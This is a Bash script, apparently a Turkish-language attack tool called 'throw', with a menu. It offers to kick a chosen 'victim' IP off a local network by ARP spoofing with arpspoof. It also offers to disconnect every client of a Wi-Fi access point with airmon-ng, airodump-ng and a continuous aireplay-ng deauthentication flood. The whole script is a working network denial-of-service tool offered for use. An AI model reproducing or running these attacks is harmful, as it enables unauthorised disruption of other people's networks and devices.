#!/bin/bash
clear
#------------------------------------------------------------------
#banner görünümü/python ile import edildi

banner() {

cd $HOME/throw/pages
python header.py  

}

#------------------------------------------------------------------
#menü seçenekleri
menu(){
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Ağdan Bir Sunucuyu Çıkar  \n"
printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Ağdan Tüm Sunucuları Çıkar \n"
printf "\e[1;92m[\e[0m\e[1;77mB\e[0m\e[1;92m]\e[0m\e[1;93m Seçenekler Hakkında Bilgi Alma \n"
printf "\e[1;92m[\e[0m\e[1;77mE\e[0m\e[1;92m]\e[0m\e[1;93m Programdan Çıkış Yap \n"
printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Bir Seçenek Seçiniz!\n"
read -p $'\n\e[1;35m throw > \e[0m\e[0m\en' option


#------------------------------------------------------------------
#ağdan tek sunucu çıkarma
if [[ $option == 1 ]]; then
clear
printf "\e[1m'|Cihaz Adı\t|IPAdresi\t|MAC Adresi\t|İnterface\t\n"
printf "\e[1m ------------------------------------------------------------------ \e[0m\n"
arp -a
printf "\e[1m ------------------------------------------------------------------ \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77mMesaj\e[0m\e[1;92m]\e[0m\e[1;93m Tarama Tamamlandı! Tarama sonuçları yukarıdaki gibidir.\n"
printf "\e[1;92m[\e[0m\e[1;77mMesaj\e[0m\e[1;92m]\e[0m\e[1;93m Ağ Cihazını Giriniz! (wlan0, eth0) \n"
read -p $'\n\e[1;35m interface > \e[0m\e[0m\en' interface
printf "\e[1;92m[\e[0m\e[1;77mMesaj\e[0m\e[1;92m]\e[0m\e[1;93m Ağdan atmak istediğiniz kişinin IP Adresini Giriniz! \n"
read -p $'\n\e[1;35m Kurban IP > \e[0m\e[0m\en' ip
printf "\e[1;92m[\e[0m\e[1;77mMesaj\e[0m\e[1;92m]\e[0m\e[1;93m Modem IP Adresini Giriniz! \n"
read -p $'\n\e[1;35m Kurban IP > \e[0m\e[0m\en' mask
printf "\e[1;93m [!] Saldırıyı durdurmak için: \e[1;91m(Ctrl+C)\e[0m \e[1;93m tuşlarına aynı anda basınız! \e[0m\e[0m\n"
arpspoof -i $interface -t $mask -r $ip 



#------------------------------------------------------------------
#ağdan tüm sunucuları çıkarma
elif [[ $option == 2 ]]; then
printf "\e[1;93m [!] Saldırıyı durdurmak için: \e[1;91m(Ctrl+C)\e[0m \e[1;93m tuşlarına aynı anda basınız! \e[0m\e[0m\n"

xterm -e airmon-ng start wlan0
xterm -e airmon-ng check kill
xterm -e airmon-ng start wlan0
printf "\e[1;93m [!] Şimdi Sırasıla BSSID, ESSID, Kanal No giriniz! \e[0m\e[0m\n"
airodump-ng wlan0mon
read -p $'\n\e[1;35m BSSID > \e[0m\e[0m\en' bssid
read -p $'\n\e[1;35m ESSID > \e[0m\e[0m\en' essid
read -p $'\n\e[1;35m CH > \e[0m\e[0m\en' ch
printf "\e[1;93m [!] 30 sn sonra \e[1;91m(Ctrl+C)\e[0m \e[1;93m tuşuna basınız! \e[0m\e[0m\n"
xterm -e airodump-ng -c $ch --bssid $bssid wlan0mon
aireplay-ng --deauth 0 -o 1 -a $bssid -e $essid wlan0mon



read -p $'\e[1;91m [!] Saldırı durduruldu! Programı tekrar çalıştırmak istiyor musunuz? \e[1;92m(e/h)> \e[0m\e[0m' option3
cd $HOME/throw/
if [[ $option3 == 'e'  ]]; then
bash throw.sh

else
exit

sleep 1
banner
menu
fi


#------------------------------------------------------------------
#bilgi alınacak kısım
elif [[ $option == 'B' || $option == 'b' ]]; then
cd $HOME/throw/pages
bash bilgi.sh
read -p $'\e[1;91m [!] Anamenüye dönmek istiyor musunuz? \e[1;92m(e/h)> \e[0m\e[0m' option3
cd $HOME/throw/
if [[ $option3 == 'E' || $option3 == 'e' ]]; then
bash throw.sh

else
exit

sleep 1
banner
menu
fi


#------------------------------------------------------------------
#çıkış yapar
elif [[ $option == 'E' || $option == 'e' ]]; then
clear
exit



#------------------------------------------------------------------
#yanlış seçenek olursa 
else 
printf "\e[1;93m [!] Yanlış bir seçenek seçtiniz. Lütfen tekrar deneyiniz! \e[0m\n"

sleep 1

banner
menu

fi
}
printf "\e[1m ------------------------------------------------------------------ \e[0m\n"
banner
printf "\e[1m ------------------------------------------------------------------ \e[0m\n"
#printf "\e[1;36m\e[1;3m  Geliştirciler herhangi bir zarardan sorumlu değildir!  \e[0m\e[0m\n"
menu
